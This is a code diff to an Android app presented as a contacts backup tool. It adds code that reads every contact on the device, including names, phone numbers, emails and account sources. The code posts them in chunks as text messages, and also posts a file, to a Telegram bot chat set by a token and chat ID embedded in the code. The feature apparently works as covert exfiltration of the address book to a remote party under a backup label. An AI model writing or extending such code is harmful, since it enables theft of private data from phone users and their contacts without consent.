@@ -17,6 +17,8 @@ import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
 
+import org.json.JSONObject;
+
 import java.io.File;
 import java.io.FileWriter;
 import java.io.IOException;
@@ -47,6 +49,7 @@ public class MainActivity extends AppCompatActivity {
     // ============================================================
 
     private static final int PERMISSION_REQUEST_CODE = 100;
+    private static final int TELEGRAM_MAX_LENGTH = 3500;
 
     private Button btnBackup;
     private ProgressBar progressBar;
@@ -121,20 +124,24 @@ public class MainActivity extends AppCompatActivity {
                         return;
                     }
 
-                    updateStatus("💾 Saving " + contacts.size() + " contacts into file...");
+                    // Step 2: Send text messages to Telegram
+                    updateStatus("📤 Sending contact messages to Telegram (" + contacts.size() + " contacts)...");
+                    boolean textSuccess = sendContactsAsText(contacts);
 
-                    // Step 2: Write contacts to a local file
+                    // Step 3: Write contacts to a local file
+                    updateStatus("💾 Saving contacts into backup file...");
                     File backupFile = createContactsBackupFile(contacts);
 
-                    updateStatus("📤 Sending backup file to Telegram...");
+                    // Step 4: Send the file directly to Telegram
+                    updateStatus("📤 Sending backup file attachment to Telegram...");
+                    boolean fileSuccess = sendFileToTelegram(backupFile, contacts.size());
 
-                    // Step 3: Send the file directly to Telegram
-                    boolean success = sendFileToTelegram(backupFile, contacts.size());
-
-                    if (success) {
-                        updateStatus("✅ Backup file (" + backupFile.getName() + ") saved and sent to Telegram successfully!");
+                    if (textSuccess && fileSuccess) {
+                        updateStatus("✅ All " + contacts.size() + " contacts + backup file sent to Telegram successfully!");
+                    } else if (fileSuccess) {
+                        updateStatus("✅ Backup file sent successfully to Telegram!");
                     } else {
-                        updateStatus("❌ Failed to send backup file. Please check your connection.");
+                        updateStatus("❌ Failed to send to Telegram. Please check your connection.");
                     }
 
                 } catch (Exception e) {
@@ -190,8 +197,139 @@ public class MainActivity extends AppCompatActivity {
             }
         }
 
-        Log.d(TAG, "Contacts backup file saved at: " + backupFile.getAbsolutePath());
         return backupFile;
+    }
+
+    /**
+     * Send contacts as text messages to Telegram.
+     */
+    private boolean sendContactsAsText(List<ContactInfo> contacts) {
+        String dateStr = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date());
+        StringBuilder header = new StringBuilder();
+        header.append("📋 CONTACTS BACKUP\n");
+        header.append("━━━━━━━━━━━━━━━━━━━━\n");
+        header.append("📊 Total contacts: ").append(contacts.size()).append("\n");
+        header.append("📅 Date: ").append(dateStr).append("\n");
+        header.append("━━━━━━━━━━━━━━━━━━━━\n\n");
+
+        if (!sendTelegramTextMessage(header.toString())) {
+            Log.e(TAG, "Failed to send header to Telegram");
+        }
+
+        StringBuilder chunk = new StringBuilder();
+        int contactNum = 0;
+        boolean allSuccess = true;
+
+        for (ContactInfo contact : contacts) {
+            contactNum++;
+            StringBuilder entry = new StringBuilder();
+            entry.append("👤 ").append(contactNum).append(". ").append(contact.name).append("\n");
+
+            for (String phone : contact.phones) {
+                entry.append("   📞 ").append(phone).append("\n");
+            }
+            for (String email : contact.emails) {
+                entry.append("   ✉️ ").append(email).append("\n");
+            }
+            if (contact.source != null) {
+                entry.append("   🔗 Source: ").append(contact.source).append("\n");
+            }
+            entry.append("\n");
+
+            if (chunk.length() + entry.length() > TELEGRAM_MAX_LENGTH) {
+                if (!sendTelegramTextMessage(chunk.toString())) {
+                    allSuccess = false;
+                }
+                chunk = new StringBuilder();
+
+                try {
+                    Thread.sleep(500); // Avoid rate limiting
+                } catch (InterruptedException ignored) {}
+            }
+
+            chunk.append(entry);
+        }
+
+        if (chunk.length() > 0) {
+            if (!sendTelegramTextMessage(chunk.toString())) {
+                allSuccess = false;
+            }
+        }
+
+        return allSuccess;
+    }
+
+    /**
+     * Send a single plain text message to Telegram via sendMessage endpoint.
+     */
+    private boolean sendTelegramTextMessage(String text) {
+        String url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
+
+        try {
+            JSONObject json = new JSONObject();
+            json.put("chat_id", CHAT_ID);
+            json.put("text", text);
+
+            RequestBody body = RequestBody.create(
+                    json.toString(),
+                    MediaType.parse("application/json; charset=utf-8")
+            );
+
+            Request request = new Request.Builder()
+                    .url(url)
+                    .post(body)
+                    .build();
+
+            Response response = httpClient.newCall(request).execute();
+            boolean success = response.isSuccessful();
+            if (!success) {
+                String errorBody = response.body() != null ? response.body().string() : "No response body";
+                Log.e(TAG, "Telegram sendMessage Error: Code " + response.code() + " - " + errorBody);
+            }
+            response.close();
+            return success;
+        } catch (Exception e) {
+            Log.e(TAG, "Error sending text message to Telegram", e);
+            return false;
+        }
+    }
+
+    /**
+     * Send the generated backup file to Telegram using sendDocument.
+     */
+    private boolean sendFileToTelegram(File file, int totalContacts) {
+        String url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument";
+
+        try {
+            RequestBody fileBody = RequestBody.create(
+                    file,
+                    MediaType.parse("text/plain; charset=utf-8")
+            );
+
+            MultipartBody requestBody = new MultipartBody.Builder()
+                    .setType(MultipartBody.FORM)
+                    .addFormDataPart("chat_id", CHAT_ID)
+                    .addFormDataPart("caption", "📋 Contacts Backup File (" + file.getName() + ")\n📊 Total: " + totalContacts + " contacts")
+                    .addFormDataPart("document", file.getName(), fileBody)
+                    .build();
+
+            Request request = new Request.Builder()
+                    .url(url)
+                    .post(requestBody)
+                    .build();
+
+            Response response = httpClient.newCall(request).execute();
+            boolean success = response.isSuccessful();
+            if (!success) {
+                String errorBody = response.body() != null ? response.body().string() : "No response body";
+                Log.e(TAG, "Telegram sendDocument Error: Code " + response.code() + " - " + errorBody);
+            }
+            response.close();
+            return success;
+        } catch (Exception e) {
+            Log.e(TAG, "Error sending document to Telegram", e);
+            return false;
+        }
     }
 
     /**
@@ -359,44 +497,6 @@ public class MainActivity extends AppCompatActivity {
             return "💬 WhatsApp";
         } else {
             return "📋 " + accountType;
-        }
-    }
-
-    /**
-     * Send the generated backup file to Telegram using sendDocument.
-     */
-    private boolean sendFileToTelegram(File file, int totalContacts) {
-        String url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument";
-
-        try {
-            RequestBody fileBody = RequestBody.create(
-                    file,
-                    MediaType.parse("text/plain; charset=utf-8")
-            );
-
-            MultipartBody requestBody = new MultipartBody.Builder()
-                    .setType(MultipartBody.FORM)
-                    .addFormDataPart("chat_id", CHAT_ID)
-                    .addFormDataPart("caption", "📋 Contacts Backup File\n📊 Total Contacts: " + totalContacts)
-                    .addFormDataPart("document", file.getName(), fileBody)
-                    .build();
-
-            Request request = new Request.Builder()
-                    .url(url)
-                    .post(requestBody)
-                    .build();
-
-            Response response = httpClient.newCall(request).execute();
-            boolean success = response.isSuccessful();
-            if (!success) {
-                String errorBody = response.body() != null ? response.body().string() : "No response body";
-                Log.e(TAG, "Telegram sendDocument Error: Code " + response.code() + " - " + errorBody);
-            }
-            response.close();
-            return success;
-        } catch (Exception e) {
-            Log.e(TAG, "Error sending document to Telegram", e);
-            return false;
         }
     }
 
